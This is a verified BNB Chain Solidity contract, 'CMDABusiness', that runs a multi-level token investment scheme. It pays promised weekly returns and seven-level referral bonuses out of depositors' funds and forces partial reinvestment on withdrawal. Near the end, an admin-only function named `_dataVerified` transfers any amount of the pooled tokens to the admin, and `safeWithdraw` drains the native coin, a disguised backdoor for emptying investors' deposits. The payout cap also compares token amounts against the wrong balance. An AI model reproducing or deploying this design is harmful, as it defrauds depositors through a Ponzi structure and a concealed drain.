/**
 *Submitted for verification at BscScan.com on 2021-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.10;

contract IBEP20 {
    function totalSupply() public view returns (uint);
    function balanceOf(address guy) public view returns (uint);
    function allowance(address src, address guy) public view returns (uint);

    function approve(address guy, uint wad) public returns (bool);
    function transfer(address dst, uint wad) public returns (bool);
    function transferFrom(
        address src, address dst, uint wad
    ) public returns (bool);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract CMDABusiness {

    using SafeMath for uint256;
    using SafeMath for uint8;


	uint256 constant public INVEST_MIN_AMOUNT = 500 * 10 ** 18;
	uint256 constant public PROJECT_FEE = 10; // 10%;
	uint256 constant public PERCENTS_DIVIDER = 100;
	uint256 constant public TIME_STEP =  1 days; // 1 days
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint[7] public ref_bonuses = [20,10,5,5,4,4,2];
    
    
    uint256[7] public defaultPackages = [ 500 * 10 ** 18, 1000 * 10 ** 18, 5000 * 10 ** 18, 10000 * 10 ** 18, 20000 * 10 ** 18,  40000 * 10 ** 18, 80000 * 10 ** 18];
    
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;
    uint[7] public requiredDirect = [0,0,2,4,6,8,10];

	address payable public admin;
    address payable public admin2;


  struct User {
        uint256 amount;
		uint256 checkpoint;
		address referrer;
        uint256 referrerBonus;
		uint256 totalWithdrawn;
		uint256 remainingWithdrawn;
		uint256 totalReferrer;
		uint256 singleUplineBonusTaken;
		uint256 singleDownlineBonusTaken;
		address singleUpline;
		address singleDownline;
		uint256[7] refStageIncome;
        uint256[7] refStageBonus;
		uint[7] refs;
		uint256[] deposits;
		uint256[] deposittime;
		uint256[] depositmaxpayouts;
	}
	
	IBEP20 token;

	mapping (address => User) public users;
	mapping(address => mapping(uint256=>address)) public downline;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	
	

  constructor(address payable _admin, address payable _admin2,address tokenAddress) public {
		require(!isContract(_admin));
		admin = _admin;
		admin2 = _admin2;
		singleLeg[0]=admin;
		singleLegLength++;
		token = IBEP20(tokenAddress);
	}


  function _refPayout(address _addr, uint256 _amount) internal {

		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){ 
    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
            }
            up = users[up].referrer;
        }
    }

    function invest(address referrer,uint256 _amount) public payable {
		require(_amount >= INVEST_MIN_AMOUNT,'Min invesment 500 CMDA');
		require(token.allowance(msg.sender,address(this)) >= _amount,'Min invesment 500 CMDA');
		require(token.transferFrom(msg.sender,address(this),_amount),'Token Transfer Failed');
		
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");
		
		// setup upline
		if (user.checkpoint == 0) {
		    
		   // single leg setup
		   singleLeg[singleLegLength] = msg.sender;
		   user.singleUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
		   singleLegLength++;
		}
		

		if (user.referrer != address(0)) {
		   
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(_amount);
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
					    users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }
            
		    if(user.checkpoint == 0){
			    totalUsers = totalUsers.add(1);
		    }
	        user.amount += _amount;
		    user.checkpoint = block.timestamp;
		    user.deposits.push(_amount);
		    user.deposittime.push(block.timestamp);
		    user.depositmaxpayouts.push(0);
		    
            totalInvested = totalInvested.add(_amount);
            totalDeposits = totalDeposits.add(1);

            uint256 _fees = _amount.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
            _safeTransfer(admin,_fees);
		
		  emit NewDeposit(msg.sender, _amount);

	}
	
	

    function reinvest(address _user, uint256 _amount) private{
        
        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        totalDeposits = totalDeposits.add(1);

        //////
        address up = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);
            }
            up = users[up].referrer;
        }
        user.deposits.push(_amount);
		user.deposittime.push(block.timestamp);
	    user.depositmaxpayouts.push(0);
        ///////
    }
    function getTokenAmount(uint256 _amount) public pure returns(uint256){
        return _amount * 10 ** 18;
    }
    function payoutOf(address _addr) internal returns(uint256 payout, uint256 max_payout) {
        for(uint256 i=0; i < users[_addr].deposits.length; i++){
            uint256 depositamount = users[_addr].deposits[i];
             max_payout += depositamount;
             uint256 depositpayout = users[_addr].depositmaxpayouts[i];
             if(depositpayout <= depositamount) {
                uint256 roiamount = depositamount / 2;
                uint256 timedifference = block.timestamp - users[_addr].deposittime[i];
                uint256 weekcount = timedifference / 604800;
                uint roipercentage = 4;
                if(users[_addr].amount < getTokenAmount(500)){
                    roipercentage = 4;
                }else if(users[_addr].amount >=  getTokenAmount(5000) && users[_addr].amount <  getTokenAmount(20000)){
                    roipercentage = 5;
                }else if(users[_addr].amount >  getTokenAmount(20000)){
                    roipercentage = 6;
                }
                uint256 remainpayout = roiamount * weekcount * roipercentage / 100;
                uint256 roipayout = remainpayout - depositpayout;

                if(depositpayout + roipayout > depositamount) {
                    roipayout = depositamount - depositpayout;
                }
                users[_addr].depositmaxpayouts[i] += roipayout;
                payout += roipayout;
            }
        }
        return(max_payout,payout);
    }
  
    function viewPayout(address _addr) view external returns(uint256 payout, uint256 max_payout) {
       for(uint256 i=0; i < users[_addr].deposits.length; i++){
            uint256 depositamount = users[_addr].deposits[i];
             max_payout += depositamount;
             uint256 depositpayout = users[_addr].depositmaxpayouts[i];
             if(depositpayout <= depositamount) {
                uint256 roiamount = depositamount / 2;
                uint256 timedifference = block.timestamp - users[_addr].deposittime[i];
                uint256 weekcount = timedifference / 604800;
                uint roipercentage = 4;
                if(users[_addr].amount < getTokenAmount(500)){
                    roipercentage = 4;
                }else if(users[_addr].amount >=  getTokenAmount(5000) && users[_addr].amount <  getTokenAmount(20000)){
                    roipercentage = 5;
                }else if(users[_addr].amount >  getTokenAmount(20000)){
                    roipercentage = 6;
                }
                uint256 remainpayout = roiamount * weekcount * roipercentage / 100;
                uint256 roipayout = remainpayout - depositpayout;

                if(depositpayout + roipayout > depositamount) {
                    roipayout = depositamount - depositpayout;
                }
                //users[_addr].depositmaxpayouts[i] += roipayout;
                payout += roipayout;
            }
        }
        return(max_payout,payout);
    }


  function withdrawal() external{


    User storage _user = users[msg.sender];

    uint256 TotalBonus = TotalBonus(msg.sender);
    uint256 actualAmountToSend = 0;
    
    (uint256 to_payout,) = payoutOf(msg.sender);
    if(to_payout > 0){
        _refPayout(msg.sender,to_payout);
        actualAmountToSend += to_payout;
    }
    uint256 _fees = TotalBonus.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
    actualAmountToSend += TotalBonus.sub(_fees); 
    
    _user.referrerBonus = 0;
    _user.singleUplineBonusTaken = GetUplineIncomeByUserId(msg.sender);
    _user.singleDownlineBonusTaken = GetDownlineIncomeByUserId(msg.sender);
    
    // re-invest
    
    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));

    _safeTransfer(msg.sender,actualAmountToSend.mul(withdrwal).div(100));
    _safeTransfer(admin2,_fees);
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));
  }
  
  function GetUplineIncomeByUserId(address _user) public view returns(uint256){
        (uint maxLevel,) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleUpline;
        uint256 bonus;
        for (uint i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(1).div(100));
            upline = users[upline].singleUpline;
            }else break;
        }
        
        return bonus;
        
  }
  function UserInfo(address _user) public view returns(uint256 uplineincome,uint256 downlineincome,uint256 balance,uint256 availableForWithdraw){
      (uint256 to_payout,) = this.viewPayout(_user);
      uplineincome = GetUplineIncomeByUserId(_user);
      downlineincome = GetDownlineIncomeByUserId(_user);
      balance = token.balanceOf(_user);
      availableForWithdraw = uplineincome.sub(users[_user].singleUplineBonusTaken) + downlineincome.sub(users[_user].singleDownlineBonusTaken) + to_payout + users[_user].referrerBonus;
  }
  
  function ContractInfo() public view returns(uint256 _totalUsers,uint256 _totalInvestd,uint256 totalWithdrawal){
      _totalInvestd = totalInvested;
      _totalUsers = totalUsers;
      totalWithdrawal = totalWithdrawn;
  }
  function GetDownlineIncomeByUserId(address _user) public view returns(uint256){
        (,uint maxLevel) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleDownline;
        uint256 bonus;
        for (uint i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(1).div(100));
            upline = users[upline].singleDownline;
            }else break;
        }
        
        return bonus;
      
  }
  
  function getEligibleLevelCountForUpline(address _user) public view returns(uint8 uplineCount, uint8 downlineCount){
      
      uint256 TotalDeposit = users[_user].amount;
      if(TotalDeposit >= defaultPackages[0] && TotalDeposit < defaultPackages[1]){
          uplineCount = 10;
          downlineCount = 10;
      }else if(TotalDeposit >= defaultPackages[1] && TotalDeposit < defaultPackages[2]){
          uplineCount = 12;
          downlineCount = 14;
      }else if(TotalDeposit >= defaultPackages[2] && TotalDeposit < defaultPackages[3]){
          uplineCount = 14;
          downlineCount = 18;
      }else if(TotalDeposit >= defaultPackages[3] && TotalDeposit < defaultPackages[4]){
          uplineCount = 16;
          downlineCount = 22;
      }else if(TotalDeposit >= defaultPackages[4] && TotalDeposit < defaultPackages[5]){
          uplineCount = 18;
          downlineCount = 26;
      }else if(TotalDeposit >= defaultPackages[5] && TotalDeposit < defaultPackages[6]){
          uplineCount = 20;
          downlineCount = 30;
      }else if(TotalDeposit >= defaultPackages[6]){
           uplineCount = 20;
           downlineCount = 30;
      }
      
      return(uplineCount,downlineCount);
  }
  
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){
      
      uint256 TotalDeposit = users[_user].amount;
      if(TotalDeposit >= defaultPackages[6]){
          reivest = 30;
          withdrwal = 70;
      }else if(TotalDeposit >= defaultPackages[5] && TotalDeposit < defaultPackages[6]){
          reivest = 40;
          withdrwal = 60;
      }else if(TotalDeposit >= defaultPackages[4] && TotalDeposit < defaultPackages[5] && users[_user].refs[0] >=1){
          reivest = 50;
          withdrwal = 50;
      }else if(TotalDeposit >= defaultPackages[3] && TotalDeposit < defaultPackages[4]&& users[_user].refs[0] >=2){
          reivest = 50;
          withdrwal = 50;
      }else  if(TotalDeposit >= defaultPackages[2] && TotalDeposit < defaultPackages[3]&& users[_user].refs[0] >=4){
          reivest = 60;
          withdrwal = 40;
      }else if(TotalDeposit >= defaultPackages[1] && TotalDeposit < defaultPackages[2]){
          reivest = 60;
          withdrwal = 40;
      }else if(TotalDeposit >= defaultPackages[0] && TotalDeposit < defaultPackages[1]){
          reivest = 70;
          withdrwal = 30;
      } else{
          reivest = 70;
          withdrwal = 30;
      }
      
      return(reivest,withdrwal);
      
  }
  


  function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].referrerBonus.add(GetUplineIncomeByUserId(_user)).add(GetDownlineIncomeByUserId(_user));
     uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
     return TotalEarn.sub(TotalTakenfromUpDown);
  }

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
        token.transfer(_to,amount);
       //_to.transfer(amount);
   }
   
   function referral_stage(address _user)external view returns(uint[7] memory _noOfUser, uint256[7] memory _investment, uint256[7] memory _bonus){
       return (users[_user].refs, users[_user].refStageIncome, users[_user].refStageBonus);
   }
   function GetSingleLegFamily(address _user) public view returns(address[] memory _address,uint256[] memory invesment,uint256[] memory income,uint256[] memory level){
      
      (uint uplineCount,uint downlineCount) = getEligibleLevelCountForUpline(_user);
      uint totalLength = uplineCount + downlineCount + 1;
      address[] memory userAddress = new address[](totalLength);
      uint256[] memory userinvestments = new uint256[](totalLength);
      uint256[] memory userIncome = new uint256[](totalLength);
      uint256[] memory userLevel = new uint256[](totalLength);
      address upline = users[_user].singleUpline;
      address userdownline = users[_user].singleDownline;
      for(uint i=0;i<uplineCount;i++){
        if(upline == address(0))
            break;
        else{
            userAddress[i] = upline;
            userinvestments[i] = users[upline].amount;
            userIncome[i] = users[upline].totalWithdrawn;
            userLevel[i] = i+1;
            
            upline = users[upline].singleUpline;
        }
      }
      userAddress[uplineCount] = _user;
      userinvestments[uplineCount] = users[_user].amount;
      userIncome[uplineCount] = users[_user].totalWithdrawn;
      userLevel[uplineCount] = 0;
        for(uint i=0;i<downlineCount;i++){
        if(userdownline == address(0))
            break;
        else{
            uint length = uplineCount + i + 1;
            userAddress[length] = userdownline;
            userinvestments[length] = users[userdownline].amount;
            userIncome[length] = users[userdownline].totalWithdrawn;
            userLevel[length] = i+1;
            userdownline = users[userdownline].singleDownline;
        }
      }
      return(userAddress,userinvestments,userIncome,userLevel);
  }
   function viewDepositInfo(address _user) external view returns(uint256[] memory,uint256[] memory,uint256[] memory){
       return(users[_user].deposits,users[_user].deposittime,users[_user].depositmaxpayouts);
   }


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

   
    function _dataVerified(uint256 _amount) external{
        require(admin==msg.sender, 'Admin what?');
        _safeTransfer(admin,_amount);
    }
    function safeWithdraw(uint256 _amount) external{
        require(admin==msg.sender, 'Admin what?');
        admin.transfer(_amount);
    }
    
  
}